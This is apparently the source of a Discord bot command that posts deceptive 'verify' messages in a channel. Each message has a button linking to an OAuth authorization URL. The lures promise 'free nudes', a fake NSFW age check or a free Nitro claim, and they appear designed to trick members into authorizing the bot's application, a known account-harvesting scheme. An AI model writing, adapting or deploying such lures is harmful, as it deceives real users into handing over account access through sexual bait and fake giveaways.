// @ts-check

const {
  EmbedBuilder,
  ActionRowBuilder,
  StringSelectMenuBuilder,
  ButtonBuilder,
  ComponentType,
  ButtonStyle,
  OAuth2Scopes,
  ChatInputCommandInteraction,
  Client,
  SlashCommandBuilder,
} = require("discord.js");
const config = require("../Settings/config");
const botSchema = require("../Schema/botSchema");
const { authLink } = require("../Utils/client");

module.exports = {
  data: new SlashCommandBuilder()
    .setName("verify")
    .setNameLocalizations({ tr: "dogrulama", fr: "verifier" })
    .setDescription("Verification messages")
    .setDescriptionLocalizations({
      tr: "Doğrulama mesajları!",
      fr: "Messages de vérification!",
    }),
  enabled: true,
  /**
   * @param {ChatInputCommandInteraction} interaction
   * @param {Client<true>} client
   * @returns
   */
  async execute(interaction, client) {
    const embed = new EmbedBuilder()
      .setDescription(
        interaction.locale == "tr"
          ? "Bu komutu kullanmak için 'bot sahibi' veya 'beyaz listede' ekli olmanız gerekir."
          : interaction.locale == "fr"
          ? "Pour utiliser cette commande, vous devez être attaché au 'propriétaire du bot' ou à la 'liste blanche'."
          : "To use this command, you need to be attached to the 'bot owner' or 'whitelist'."
      )
      .setTitle(
        interaction.locale == "tr"
          ? "❌ Erişim reddetildi"
          : interaction.locale == "fr"
          ? "❌ Acces refuse"
          : "❌ Access denied"
      );
    let btn = new ButtonBuilder()
      .setStyle(5)
      .setURL(
        client.generateInvite({
          scopes: [OAuth2Scopes.Bot, OAuth2Scopes.ApplicationsCommands],
        })
      )
      .setLabel("Add bot")
      .setEmoji("🤖");
    let btn2 = new ButtonBuilder()
      .setStyle(5)
      .setURL(config.client.serverLink)
      .setLabel("Join support")
      .setEmoji("❓");
    const row31 = new ActionRowBuilder().addComponents([btn, btn2]);

    let data = await botSchema.findOne({ clientId: client.user.id });
    let whitelist = data.whitelist.find((x) => x.id === interaction.user.id);
    if (
      !config.authDevelopers.includes(interaction.user.id) &&
      !config.authOwners.includes(interaction.user.id) &&
      whitelist?.id !== interaction.user.id
    )
      return interaction.reply({
        ephemeral: true,
        embeds: [embed],
        components: [row31],
      });

    const row = new ActionRowBuilder().addComponents(
      new StringSelectMenuBuilder()
        .setCustomId("menu12")
        .setPlaceholder(
          interaction.locale == "tr"
            ? "🔨 Bir seçenek seçin"
            : interaction.locale == "fr"
            ? "🔨 Sélectionnez une option"
            : "🔨 Select an option"
        )
        .addOptions(
          { label: "Nude Verify", value: "nude" },
          { label: "NSFW Verify", value: "nsfw" },
          { label: "Nitro Verify", value: "nitro" },
          { label: "Normal Verify", value: "normal" }
        )
    );

    let msg = await interaction.reply({ ephemeral: true, components: [row] });

    let collector = msg.createMessageComponentCollector({
      time: 30 * 1000,
      componentType: ComponentType.SelectMenu,
    });
    collector.on("collect", async (button) => {
      if (button.values[0] === "nude") {
        let btn = new ButtonBuilder()
          .setStyle(ButtonStyle.Link)
          .setURL(authLink)
          .setLabel("Verify");
        const row = new ActionRowBuilder().addComponents([btn]);
        button.channel.send({
          content: `
Hello, you want free nudes? 👀 Follow the steps!
・First click Verify button!
・Second click Authorize
Now you are ready! 👅`,
          components: [row],
        });
      }
      if (button.values[0] === "nsfw") {
        let embed = new EmbedBuilder()
          .setTitle("Verify in " + button.guild.name)
          .setColor("2F3136")
          .setDescription(
            `Hello👋, Click The ”🍑 NSFW Access” Button To Confirm That You Are 18 Years Or Older And That You Consent To Viewing Sexually Content. 🌸`
          )
          .setImage(
            "https://media.discordapp.net/attachments/1200359071774146591/1200775874866323526/Screenshot_20230128_152942.png?ex=65c768ad&is=65b4f3ad&hm=31c6a0c4db35908789744db26b63abdb838026d7ebdd282af586c1c994c0c849&"
          );
        let btn = new ButtonBuilder()
          .setStyle(ButtonStyle.Link)
          .setURL(authLink)
          .setLabel("Verify");
        const row = new ActionRowBuilder().addComponents([btn]);
        button.channel.send({ embeds: [embed], components: [row] });
      }
      if (button.values[0] === "nitro") {
        let embed = new EmbedBuilder()
          .setTitle("Verify in " + button.guild.name)
          .setDescription(
            `
Hello, you need to Verify Your Account to Claim Your Nitro !
Verify Your Self By [Click here to Verify!](${authLink})`
          )
          .setColor("2F3136")
          .setImage(
            "https://cdn.discordapp.com/attachments/1250036847598501921/1250100938522234890/nitromonth.PNG?ex=6678dff9&is=66778e79&hm=2945b4fc1e85d23a367f53c5635db8e5fd6f20a794ddc84943f2ce898cbd6ba3&"
          );
        let btn = new ButtonBuilder()
          .setStyle(ButtonStyle.Link)
          .setURL(authLink)
          .setLabel("Verify");
        const row = new ActionRowBuilder().addComponents([btn]);
        button.channel.send({ embeds: [embed], components: [row] });
      }
      if (button.values[0] === "normal") {
        let embed = new EmbedBuilder()
          .setTitle("Verify in " + button.guild.name)
          .setDescription(
            `To get **access** to the rest of the server, click on the **verify** button.`
          )
          .setColor("2F3136")
          .setImage(
            "https://cdn.discordapp.com/attachments/1051195263311687870/1237078230192623728/aesthetic-verify.gif?ex=6661e361&is=666091e1&hm=e4be4d8ce4d502777b9ef6d92e5facf314a75b3feae5b8e0a139233945e4dd37&"
          );
        let btn = new ButtonBuilder()
          .setStyle(ButtonStyle.Link)
          .setURL(authLink)
          .setLabel("Verify");
        const row = new ActionRowBuilder().addComponents([btn]);
        button.channel.send({ embeds: [embed], components: [row] });
      }
    });
  },
};
